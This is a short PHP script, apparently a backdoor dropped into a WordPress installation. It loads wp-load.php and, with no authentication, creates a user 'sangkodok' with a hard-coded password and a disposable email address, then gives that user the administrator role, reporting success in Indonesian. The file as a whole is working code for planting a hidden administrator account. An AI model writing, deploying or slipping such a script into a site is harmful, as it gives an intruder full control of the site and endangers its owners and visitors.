<?php
require_once( __DIR__ . '/wp-load.php' );

$username = 'sangkodok';
$password = 'numpangcomotom123';
$email    = 'supermen@mailto.plus';

if (username_exists($username) || email_exists($email)) {
    echo "User sudah ada!";
} else {
    $user_id = wp_create_user($username, $password, $email);
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    echo "Berhasil menambahkan admin: $username";
}
